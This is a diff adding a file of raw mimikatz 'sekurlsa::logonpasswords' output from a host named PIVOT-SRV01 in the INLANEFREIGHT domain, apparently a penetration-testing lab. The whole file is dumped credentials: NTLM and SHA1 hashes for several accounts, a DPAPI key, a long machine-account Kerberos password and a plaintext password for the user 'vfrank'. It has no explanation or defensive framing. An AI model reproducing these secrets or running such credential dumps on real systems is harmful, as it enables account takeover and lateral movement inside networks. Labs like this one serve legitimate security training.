@@ -1,0 +1,386 @@
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 1560937 (00000000:0017d169)
+Session           : RemoteInteractive from 2
+User Name         : mlefay
+Domain            : PIVOT-SRV01
+Logon Server      : PIVOT-SRV01
+Logon Time        : 4/23/2026 9:19:35 AM
+SID               : S-1-5-21-1602415334-2376822715-119304339-1003
+        msv :
+         [00000003] Primary
+         * Username : mlefay
+         * Domain   : PIVOT-SRV01
+         * NTLM     : 2831bf1e4e0841d882328d5481fb5c92
+         * SHA1     : ccb38ae19c47a04fa01542f30466d6c48ddc18d7
+        tspkg :
+        wdigest :
+         * Username : mlefay
+         * Domain   : PIVOT-SRV01
+         * Password : (null)
+        kerberos :
+         * Username : mlefay
+         * Domain   : PIVOT-SRV01
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1531313 (00000000:00175db1)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2026 9:19:34 AM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
+         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
+        tspkg :
+        wdigest :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1531281 (00000000:00175d91)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2026 9:19:34 AM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
+         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
+        tspkg :
+        wdigest :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 823549 (00000000:000c90fd)
+Session           : NetworkCleartext from 0
+User Name         : mlefay
+Domain            : PIVOT-SRV01
+Logon Server      : PIVOT-SRV01
+Logon Time        : 4/23/2026 9:04:27 AM
+SID               : S-1-5-21-1602415334-2376822715-119304339-1003
+        msv :
+         [00000003] Primary
+         * Username : mlefay
+         * Domain   : PIVOT-SRV01
+         * NTLM     : 2831bf1e4e0841d882328d5481fb5c92
+         * SHA1     : ccb38ae19c47a04fa01542f30466d6c48ddc18d7
+        tspkg :
+        wdigest :
+         * Username : mlefay
+         * Domain   : PIVOT-SRV01
+         * Password : (null)
+        kerberos :
+         * Username : mlefay
+         * Domain   : PIVOT-SRV01
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 163110 (00000000:00027d26)
+Session           : Service from 0
+User Name         : vfrank
+Domain            : INLANEFREIGHT
+Logon Server      : ACADEMY-PIVOT-D
+Logon Time        : 4/23/2026 8:56:01 AM
+SID               : S-1-5-21-3858284412-1730064152-742000644-1103
+        msv :
+         [00000003] Primary
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 2e16a00be74fa0bf862b4256d0347e83
+         * SHA1     : b055c7614a5520ea0fc1184ac02c88096e447e0b
+         * DPAPI    : 97ead6d940822b2c57b18885ffcc5fb4
+        tspkg :
+        wdigest :
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : Imply wet Unmasked!
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 73945 (00000000:000120d9)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2026 8:55:35 AM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
+         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
+        tspkg :
+        wdigest :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 73925 (00000000:000120c5)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2026 8:55:35 AM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
+         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
+        tspkg :
+        wdigest :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 43736 (00000000:0000aad8)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2026 8:55:34 AM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
+         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
+        tspkg :
+        wdigest :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : PIVOT-SRV01$
+Domain            : INLANEFREIGHT
+Logon Server      : (null)
+Logon Time        : 4/23/2026 8:55:34 AM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : pivot-srv01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1530394 (00000000:00175a1a)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2026 9:19:34 AM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
+         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
+        tspkg :
+        wdigest :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 821499 (00000000:000c88fb)
+Session           : Service from 0
+User Name         : sshd_2384
+Domain            : VIRTUAL USERS
+Logon Server      : (null)
+Logon Time        : 4/23/2026 9:04:19 AM
+SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-2384
+        msv :
+         [00000003] Primary
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
+         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
+        tspkg :
+        wdigest :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : PIVOT-SRV01$
+Domain            : INLANEFREIGHT
+Logon Server      : (null)
+Logon Time        : 4/23/2026 8:55:34 AM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
+         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
+        tspkg :
+        wdigest :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : pivot-srv01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 42569 (00000000:0000a649)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/23/2026 8:55:34 AM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
+         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1560908 (00000000:0017d14c)
+Session           : RemoteInteractive from 2
+User Name         : mlefay
+Domain            : PIVOT-SRV01
+Logon Server      : PIVOT-SRV01
+Logon Time        : 4/23/2026 9:19:35 AM
+SID               : S-1-5-21-1602415334-2376822715-119304339-1003
+        msv :
+         [00000003] Primary
+         * Username : mlefay
+         * Domain   : PIVOT-SRV01
+         * NTLM     : 2831bf1e4e0841d882328d5481fb5c92
+         * SHA1     : ccb38ae19c47a04fa01542f30466d6c48ddc18d7
+        tspkg :
+        wdigest :
+         * Username : mlefay
+         * Domain   : PIVOT-SRV01
+         * Password : (null)
+        kerberos :
+         * Username : mlefay
+         * Domain   : PIVOT-SRV01
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/23/2026 8:55:35 AM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 43774 (00000000:0000aafe)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2026 8:55:34 AM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
+         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
+        tspkg :
+        wdigest :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : PIVOT-SRV01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
+        ssp :
+        credman :
